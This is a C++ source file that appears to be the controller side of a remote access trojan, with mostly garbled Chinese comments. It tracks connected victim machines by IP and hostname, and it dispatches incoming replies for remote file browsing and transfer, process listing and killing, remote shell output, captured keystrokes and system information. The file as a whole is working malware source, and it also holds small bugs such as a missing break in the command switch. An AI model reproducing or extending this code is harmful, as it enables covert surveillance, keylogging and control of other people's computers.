//////////////////////////////////////////////////////////////////////////
//File:	MainFunc.cpp
//Rem:	��������ƺ���ʵ��
//////////////////////////////////////////////////////////////////////////
#pragma once
#include "MainFunc.h"
HWND hSBarDlg;
HWND hDlgMain;
BOOL bMutex = TRUE;
extern int dwSelected;
HWND hDelList = 0;
//////////////////////////////////////////////////////////////////////////
//����������
//////////////////////////////////////////////////////////////////////////
BOOL InsertNewItem(SOCKET s,SOCKADDR_IN sin)
{
	LVITEM lvItem;
	lvItem.mask =  LVIF_TEXT;
	HWND hListControl = GetDlgItem(hDlgMain,IDC_LIST1);
	char temp[1024] = {0};
	int count = ListView_GetItemCount(hListControl);
	lvItem.iItem = count;
	//���
	lvItem.iSubItem = 0;
	sprintf(temp,"%d",count);
	lvItem.pszText = temp;
	ListView_InsertItem(hListControl,&lvItem);
	//IP
	lvItem.iSubItem = 1;
	sprintf(temp,"%s",inet_ntoa(sin.sin_addr));
	lvItem.pszText = temp;
	ListView_SetItem(hListControl,&lvItem);
	//��������
	lvItem.iSubItem = 2;
	lvItem.pszText = GetHostName(sin,temp);
	ListView_SetItem(hListControl,&lvItem);
	//��ע
	lvItem.iSubItem = 3;
	sprintf(temp,"%s","  ");
	lvItem.pszText = temp;
	ListView_SetItem(hListControl,&lvItem);
	//Socket Numbers
	lvItem.iSubItem = 4;
	sprintf(temp,"%d",(int)s);
	lvItem.pszText = temp;
	ListView_SetItem(hListControl,&lvItem);


	//�������߻�����
	sprintf(temp,"���߻�����%d",count+1);
	SendMessage(hSBarDlg,SB_SETTEXT,NULL,(LPARAM)temp);

	return TRUE;
}


//////////////////////////////////////////////////////////////////////////
//��ʼ��ListControl�ؼ�
//////////////////////////////////////////////////////////////////////////
BOOL InitListControl(HWND hListControl)
{
	hDelList = hListControl;
	LVCOLUMN lvCol;
	char *szColumn[]= {"���", "IP","��������","��ע","SOCKETS"};
	int i, width[]= {50,100,149,50,100};

	ZeroMemory(&lvCol, sizeof(LVCOLUMN));

	lvCol.mask= LVCF_TEXT | LVCF_SUBITEM | LVCF_WIDTH | LVCF_FMT;
	lvCol.fmt= LVCFMT_LEFT;
	ListView_SetExtendedListViewStyleEx(hListControl,0 , LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES | LVS_EX_HEADERDRAGDROP);

	for( i=0; i<5; i++ )
	{
		lvCol.iSubItem= i;
		lvCol.cx= width[i];
		lvCol.pszText= szColumn[i];

		ListView_InsertColumn(hListControl, i, &lvCol);
	}

	return TRUE;
}


//////////////////////////////////////////////////////////////////////////
//���������б�
//////////////////////////////////////////////////////////////////////////
BOOL RefreshListControl(HWND hListControl,int dwDel)
{
	ListView_DeleteItem(hListControl,dwDel);
	int dwCount = ListView_GetItemCount(hListControl);

	char temp[100] = {0};
	for (int i=0;i<dwCount;i++)
	{
		sprintf(temp,"%d",i);
		ListView_SetItemText(hListControl,i,0,temp);
	}

	//�������߻�����
	sprintf(temp,"���߻�����%d",dwCount);
	SendMessage(hSBarDlg,SB_SETTEXT,NULL,(LPARAM)temp);

	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//����⼦��������
//////////////////////////////////////////////////////////////////////////
char* GetHostName(SOCKADDR_IN sin,char* szHost)
{
	hostent* host = gethostbyaddr((char*)(&(sin.sin_addr.s_addr)),4,AF_INET);
	sprintf(szHost,"%s",host->h_name);

	return szHost;
}



//////////////////////////////////////////////////////////////////////////
//��������
//////////////////////////////////////////////////////////////////////////
BOOL SendCmd(SOCKET sockfd,char* pData,int dwSize)
{
	if (dwSize)
	{
		char* pSendCmd = szSendCmd + dwSendSize;
		memcpy(pSendCmd,pData,dwSize);
		dwSendSize += dwSize;
	}
	if (dwSendSize)
	{
		int nRet = send(sockfd,szSendCmd,dwSendSize,NULL);
		if (nRet == SOCKET_ERROR)
		{
			int temp = WSAGetLastError();
			if (temp != WSAEWOULDBLOCK)
			{
				SocketError(sockfd);
				return FALSE;
			}
		}
		dwSendSize -= nRet;
		if (dwSendSize)
		{
			char* pSendCmd = szSendCmd+nRet;
			memcpy(szSendCmd,pSendCmd,dwSendSize);
		}
	}

	return TRUE;
}



//////////////////////////////////////////////////////////////////////////
//��������
//////////////////////////////////////////////////////////////////////////
BOOL RecvCmd(SOCKET sockfd)
{
	int len = 0;
	if (dwRecvSize<sizeof(RatProto))
	{
		len = sizeof(RatProto);
	}
	else
	{
		len = ((RatProto*)szRecvCmd)->RatLen;
		if (len<sizeof(RatProto) || len>MAXLENGTH)
		{
			SocketError(sockfd);
			return FALSE;
		}
	}
	len -= dwRecvSize;
	if (len)
	{
		int nRet = recv(sockfd,szRecvCmd+dwRecvSize,len,NULL);
		if (nRet == SOCKET_ERROR)
		{
			if (WSAGetLastError() != WSAEWOULDBLOCK)
			{
				SocketError(sockfd);
				return FALSE;
			}
		}
		dwRecvSize += nRet;
		if (dwRecvSize==((RatProto*)szRecvCmd)->RatLen)
		{
			//��������
			BOOL flag = DispatchCmd(sockfd,dwRecvSize);
			if (!flag)
			{
				SocketError(sockfd);
			}
			dwRecvSize = 0;	
		}
	}

	return TRUE;
}




//////////////////////////////////////////////////////////////////////////
//SOCKET������,MainFunc.H�� ��������
//////////////////////////////////////////////////////////////////////////
BOOL SocketError(SOCKET sockfd)
{
	closesocket(sockfd);
	ZeroMemory(szSendCmd,sizeof(szSendCmd));
	ZeroMemory(szRecvCmd,sizeof(szRecvCmd));
	dwSendSize = dwRecvSize = 0;
	MessageBox(NULL,"Socket Error",NULL,NULL);
	RefreshListControl(hDelList,dwSelected);
	EndDialog(NULL,NULL);
	return TRUE;
}


//////////////////////////////////////////////////////////////////////////
//��������
//////////////////////////////////////////////////////////////////////////
BOOL DispatchCmd(SOCKET sockfd,int dwRecvSize)
{
	switch (((RatProto*)szRecvCmd)->RatId)
	{
	case FILE_VIEW:
		{
			//ˢ���ļ��б�
			FileView(sockfd,dwRecvSize);
		}
		break;
	case FILE_REPLY:
		{
			//�����ļ�����������Ϣ
			FileReply(sockfd,dwRecvSize);
		}
		break;
	//case FILE_DOWNREPLY:
	//	{
	//		//Ϊ�ļ�������׼��
	//		FileDownReply(sockfd,dwRecvSize);
	//	}
	//	break;
	case FILE_TRANSMIT:
		{
			//�ļ�����
			FileTransmit(sockfd,dwRecvSize);
		}
		break;
	case PROC_VIEW:
		{
			ProcView(sockfd,dwRecvSize);	
		}
		break;
	case PROC_DELETE:
		{
			ProcReDel(sockfd,dwRecvSize);
		}
		break;
	case CMD_REPLY:
		{
			//����CMD�������Ϣ
			CmdReply(sockfd,dwRecvSize);
		}
	case KEY_REPLY:
		{
			//���ռ��̼�¼�����ֻ�����뽹��ı�ʱ�Żᷢ�ͷ���
			KeyReply(sockfd,dwRecvSize);
		}
		break;
	case SYS_VIEW:
		{
			SysView(sockfd,dwRecvSize);
		}
		break;
	default:
		//�����ˣ����⴦����
		MessageBox(NULL,"ERROR",NULL,NULL);
		return FALSE;
	}

	return TRUE;
}